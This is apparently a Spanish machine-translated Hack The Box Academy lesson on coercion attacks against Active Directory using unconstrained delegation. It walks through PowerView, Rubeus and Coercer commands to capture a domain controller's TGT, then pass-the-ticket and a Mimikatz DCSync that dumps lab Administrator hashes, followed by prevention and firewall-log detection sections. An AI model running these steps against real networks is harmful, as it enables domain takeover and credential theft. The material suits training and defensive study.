# Coercing Attacks & Unconstrained Delegation

# **Descripción**

Los ataques coaccionados se han convertido en un`one-stop shop`para crecer los privilegios de cualquier usuario a administrador de dominio. Casi todas las organizaciones con una infraestructura publicitaria predeterminada son vulnerables. Acabamos de probar ataques de coaccionidad cuando discutimos el`PrinterBug`. Sin embargo, varias otras funciones de RPC pueden realizar la misma funcionalidad. Por lo tanto, cualquier usuario de dominio puede coaccionar`RemoteServer$`Para autenticarse en cualquier máquina en el dominio. Finalmente, el[Coercer](https://github.com/p0dalirius/Coercer)La herramienta se desarrolló para explotar todas las funciones de RPC vulnerables conocidas simultáneamente.

Similar al`PrinterBug`, un atacante puede elegir entre varias opciones de "seguimiento" con la conexión inversa, que, como se mencionó anteriormente, son:

1. Transmitir la conexión a otro DC y realizar DCSYNC (si`SMB Signing`está deshabilitado).
2. Obligar al controlador de dominio a conectarse a una máquina configurada para`Unconstrained Delegation` (`UD`) - Esto almacenará en caché el TGT en la memoria del servidor UD, que se puede capturar/exportar con herramientas como`Rubeus`y`Mimikatz`.
3. Transmitir la conexión a`Active Directory Certificate Services`Para obtener un certificado para el controlador de dominio. Los agentes de amenaza pueden usar el certificado a pedido para autenticar y fingir ser el controlador de dominio (por ejemplo, DCSYNC).
4. Relone la conexión para configurar la delegación de Kerberos basada en recursos para la máquina de retransmisión. Luego podemos abusar de la delegación para autenticarse como cualquier administrador de esa máquina.

---

# **Ataque**

Abusaremos del segundo "seguimiento", suponiendo que un atacante haya obtenido derechos administrativos en un servidor configurado para`Unconstrained Delegation`. Usaremos este servidor para capturar el TGT, mientras`Coercer`se ejecutará desde la máquina Kali.

Para identificar sistemas configurados para`Unconstrained Delegation`, podemos usar el`Get-NetComputer`función de[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)junto con el`-Unconstrained` switch:

Ataques coaccionados y delegación sin restricciones

```powershell
PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname

samaccountname
--------------
DC1$
SERVER01$
WS001$
DC2$

```

![](https://academy.hackthebox.com/storage/modules/176/A11/GetNetComputer.png)

`WS001`y`SERVER01`se confían en la delegación sin restricciones (los controladores de dominio se confían de forma predeterminada). Entonces, WS001 o Server01 sería un objetivo para un adversario. En nuestro escenario, ya hemos comprometido WS001 y 'Bob', que tiene derechos administrativos sobre este anfitrión. Empezaremos`Rubeus`En una solicitud administrativa para monitorear los nuevos inicios de sesión y extraer TGTS:

Ataques coaccionados y delegación sin restricciones

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs

[*] 18/12/2022 22.37.09 UTC - Found new TGT:

  User                  :  bob@EAGLE.LOCAL
  StartTime             :  18/12/2022 23.30.09
  EndTime               :  19/12/2022 09.30.09
  RenewTill             :  25/12/2022 23.30.09
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

doIE2jCCBNagAwIBBaEDAgEWooID5zCCA+NhggPfMIID26ADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0
GwtFQUdMRS5MT0NBTKOCA6EwggOdoAMCARKhAwIBAqKCA48EggOLxoWz+JE4JEP9VvNlDvGKzqQ1BjjpjjO03haKFPPeszM4Phkb    QQBPfixBqQ3bthdsizmx3hdjNzFVKnUOK2h2CDFPeUia+0rCn1FllimXQwdEFMri7whC2qA4/vy52Y2jJdmkR7ZIRAeU5Yfm373L
iEHgnX4PCA94Ck/BEwUY0bk6VAWkM2FSPgnuiCeQQ4yJMPa3DK6MHYJ/1kZy+VqxwSqov/tVhATshel1vXpr4rz03ofgNtwLDYb+    K5AGYSbSct5w1jTWtGAicCCr1vpcUguIWH0Nh1lQ+tZccVtEtsrjZ/jwCKsadQWIFwhPOnVpf5drUlav1iCXmxWqQr5glW/IOOE1
lHsBolieGSyY20ZHBYjXflCGkO13mRwqO3rQ5KMs8HrC3Aqu7Popaw29at0vzZLinYnWnHUn01hh5e3QyIkqIH3CBvaPbl3RukZ7    jZRBm6BVF7R5KEWp+6Gg2joP6WvXDBCIzqL3jmxQ8NVoeeidgnBuZKpYL45E8jJjxbW4t9D8EdlX9Xu+fj/Fazw08HtRkzwG30vE
	<SNIP>
	<SNIP>
	<SNIP>

[*] Ticket cache size: 4

```

![](https://academy.hackthebox.com/storage/modules/176/A11/RubeusMonitor.png)

A continuación, necesitamos saber la dirección IP de WS001, que podemos obtener ejecutando`ipconfig`. Una vez conocido, cambiaremos a la máquina Kali para ejecutar`Coercer`Hacia DC1, mientras lo obligamos a conectarse a WS001 si el coercing es exitoso:

Ataques coaccionados y delegación sin restricciones

```
xnoxos@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[dc1.eagle.local] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to ws001.eagle.local ...
   [>] Pipe '\PIPE\lsarpc' is accessible!
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... rpc_s_access_denied
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 12) ... ERROR_BAD_NETPATH (Attack has worked!)
   [>] Pipe '\PIPE\netdfs' is accessible!
      [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsAddStdRoot' (opnum 12) ... rpc_s_access_denied (Attack should have worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...    [>] Pipe '\PIPE\spoolss' is accessible!
      [>] On 'dc1.eagle.local' through '\PIPE\spoolss' targeting 'MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx' (opnum 65) ... rpc_s_access_denied (Attack should have worked!)

[+] All done!

```

![](https://academy.hackthebox.com/storage/modules/176/A11/Coercer.png)

Ahora, si cambiamos a WS001 y miramos la salida continua que`Rubeus`Proporcionar, debe haber un TGT para DC1 disponible:

Ataques coaccionados y delegación sin restricciones

```powershell
[*] 18/12/2022 22.55.52 UTC - Found new TGT:

  User                  :  DC1$@EAGLE.LOCAL  StartTime             :  18/12/2022 23.30.21
  EndTime               :  19/12/2022 09.30.21
  RenewTill             :  24/12/2022 09.28.39
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFdDCCBXCgAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0    GwtFQUdMRS5MT0NBTKOCBDowggQ2oAMCARKhAwIBAqKCBCgEggQkv8ILT9IdJgNgjxbddnICsd5quqFnXS7m7YwJIM/lcwLy4SHI
i1iWbvsTiu078mz28R0sn7Mxvg2oVC7NTw+b2unvmQ3utRLTgaz02WYnGWSBu7gxs+Il/0ekW5ZSX3ESq0AGwPaqUcuWSFDNNfOM
ws/8MlkJeFSFWeHwJL7FbzuCjZ2x/6UUl2IOYq0Ozaf3R+rDJQ6LqpDVAet53IoHDugduBfZoDHTZFntRAoYrmAWdcnFdUEpyZGH    Kj6i2M0TyrxUp3nq022BNB6v+sHgH3SWsMNiba+TYaeRdjiM2nVjhGZTXDuro9rLkYFk1HPXuI/d0RfzVuq9Hh5hVCZRwcM3V2BN
eYRTMeW+lvz1bBgdgK/wlYMS7J99F1V/r6K8zdO7pQ0Zj216DfA42QINPswVL+89gy7PLLm5aYlw8nlbBdvTZrPbeOhtvdBy/pFB    fxrjHA+fW34/Yk+9k6oSPXCaCQ/Rd1qZ/P57/0MDUYRlDs5EYOOxxGQPVFbOqhbG414vGRbi39ALj/MkYG629kCEb9K89p5teo6f
7w/4M6Ytun16sG3GxsWDG6dlZP+fmmOr0nwdXgvT28NQxQ3EEMErX+BojUY6DdRBH2u3fcv1KOA5K7MDma+cVLaa0YjSYZ2IDRaC    0JcgcUexd6EfQPtSnikaA/zzYmu/PSYVXlcg7cFULJIiPuN4f9VlDlVOqj8C3xCwtYo4zRklLESUES9tGK/VfsmN0Q/Fx5ULIa7y
UND/d1HlQ+R6Fnh2GGUPk+LlVw+ScD0kf2nmmlsIwhnGmscpiFs1lprX35Khlx/y5+v9S7bdokZujPpyZactQ4wdfRK++bOWo2ao    Ewrzjuq199JnTQHbxkqGgeKQedOPxOhDccQLYTm44wH73JuE+XoGKmdGbgXfjSBFlTinP9mvZA12NkQupnGYVzJ2rS1T0nf2VVUW
MfIgh8Nz4xYvDHV1iIV4ZrLI7u7ZwJtrlESgO0H0d/k6CpLxo5L7kzhkU+MJggdUFJvS3HskTxZmewEwSdKJn21YfAG1Q6X0nFqk
HdK3RUvxXcycwMvWdfYH2AW06+98q5h+TSJQrMcrp9gT+khLPD4KL2n6+cvC3BVHqge5Nc16LhW7kcNp+JcIzknwAsCZlaXzhz3X
K78ooLfZGaKGoNnDWLUQpYToVgXXSO53HJ3Vgl0MwctV7l+gJdwMtac0VVhH8EAndeSPnEcNOX8mr/30k+9GwM1wtFQNFB03CdoA    qRJBjyFw1h1KKuc61PTWuxVLwGmezshekwoSLOJ7V9G9qNpVQl0AgtTK2SHeobItuD4rhDc3/0jJ4LzsXJieYbLK7dtVfxYtSbeu
ZqXhd7HcSq5SN4LOmEP1tScir+shxQC+hbs3oYx/rHfj8GDDEZ8UwY6I4JF4pQsApKOB3zCB3KADAgEAooHUBIHRfYHOMIHLoIHI    MIHFMIHCoCswKaADAgESoSIEIDs9gBc+2myj4I7mPmXH542vha3A2zfkHbm/RxnK4oMSoQ0bC0VBR0xFLkxPQ0FMohEwD6ADAgEB
oQgwBhsEREMxJKMHAwUAYKEAAKURGA8yMDIyMTIxODIyMzAyMVqmERgPMjAyMjEyMTkwODMwMjFapxEYDzIwMjIxMjI0MDgyODM5
WqgNGwtFQUdMRS5MT0NBTKkgMB6gAwIBAqEXMBUbBmtyYnRndBsLRUFHTEUuTE9DQUw=

[*] Ticket cache size: 5

```

![](https://academy.hackthebox.com/storage/modules/176/A11/DCTGT.png)

Podemos usar este TGT para la autenticación dentro del dominio, convirtiéndose en el controlador de dominio. A partir de ahí, DCSYNC es un ataque obvio (entre otros).

Una forma de usar el TGT mencionado es a través de Rubeo, como sigue.

Ataques coaccionados y delegación sin restricciones

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Import Ticket
[+] Ticket successfully imported!
PS C:\Users\bob\Downloads> klist

Current LogonId is 0:0x101394

Cached Tickets: (1)

#0>     Client: DC1$ @ EAGLE.LOCAL        Server: krbtgt/EAGLE.LOCAL @ EAGLE.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 4/21/2023 8:54:04 (local)
        End Time:   4/21/2023 18:54:04 (local)
        Renew Time: 4/28/2023 8:54:04 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

```

Luego, un ataque DCSYNC se puede ejecutar a través de Mimikatz, esencialmente replicando lo que hicimos en la sección DCSYNC.

Ataques coaccionados y delegación sin restricciones

```powershell
PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:eagle.local /user:Administrator
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 02.00.00
Password last change : 07/08/2022 21.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6fd69313922373216cdbbfa823bd268d

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
      aes128_hmac       (4096) : 4667ae9266d48c01956ab9c869e4370f
      des_cbc_md5       (4096) : d9b53b1f6d7c45a8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Credentials
      des_cbc_md5       : d9b53b1f6d7c45a8

mimikatz # exitBye!

```

---

# **Prevención**

Windows no ofrece visibilidad granular y control sobre las llamadas RPC para permitir descubrir lo que se está utilizando y bloquear ciertas funciones. Por lo tanto, actualmente no existe una solución lista para prevenir este ataque. Sin embargo, hay dos enfoques generales diferentes para prevenir ataques de coaccionamiento:

1. Implementación de un firewall RPC de terceros, como el de[Cero redes](https://github.com/zeronetworks/rpcfirewall), y usarlo para bloquear funciones de RPC peligrosas. Esta herramienta también presenta un modo de auditoría, lo que permite el monitoreo y la obtención de visibilidad de si las interrupciones comerciales pueden ocurrir al usarla o no. Además, va un paso más allá al proporcionar la funcionalidad de bloquear las funciones de RPC si lo peligroso`OPNUM`asociado con coaccionamiento está presente en la solicitud. (Tenga en cuenta que en esta opción, para cada función RPC recientemente descubierta en el futuro, tendremos que modificar el archivo de configuración del firewall para incluirlo).
2. Controladores de dominio de bloque y otros servidores de infraestructura central desde la conexión a los puertos salientes`139`y`445`, `except`a máquinas que se requieren para AD (también para operaciones comerciales). Un ejemplo es que si bien bloqueamos el tráfico general de salida a los puertos 139 y 445, aún deberíamos permitirlo para controladores de dominio cruzado; De lo contrario, la replicación del dominio fallará. (El beneficio de esta solución es que también funcionará contra funciones de RPC vulnerables recién descubiertas u otros métodos de coercición).

---

# **Detección**

Como se mencionó, Windows no proporciona una solución lista para usar para monitorear la actividad de RPC. El firewall RPC de[Cero redes](https://github.com/zeronetworks/rpcfirewall)es un excelente método para detectar el abuso de estas funciones y puede indicar signos inmediatos de compromiso; Sin embargo, si seguimos las recomendaciones generales para no instalar software de terceros en controladores de dominio, los registros de firewall son nuestra mejor oportunidad.

Un ataque de coerción exitoso con coercer dará como resultado el siguiente registro de firewall de host, donde la máquina en`.128`es la máquina del atacante y el`.200`es el controlador de dominio:

![](https://academy.hackthebox.com/storage/modules/176/A11/Coercer-FirewallLogs.png)

Podemos ver muchas conexiones entrantes con la DC, seguidas de conexiones salientes desde la DC hasta la máquina del atacante; Este proceso se repite varias veces a medida que Coercer pasa por varias funciones diferentes. Todo el tráfico de salida está destinado al puerto 445.

Si avanzamos y bloqueamos el tráfico de salida al puerto 445, observaremos el siguiente comportamiento:

![](https://academy.hackthebox.com/storage/modules/176/A11/Coercer-FirewallLogsBlockOutbound139n445.png)

Ahora podemos ver que a pesar de que la conexión entrante es exitosa, el firewall deja el saliente y, en consecuencia, el atacante no recibe ningún TGTS coaccionado. A veces, cuando se bloquea el puerto 445, la máquina intentará conectarse al puerto 139, por lo que bloquea ambos puertos`139`y`445`se recomienda.

Lo anterior también se puede usar para la detección, ya que cualquier tráfico inesperado caída a los puertos`139`o`445`es sospechoso.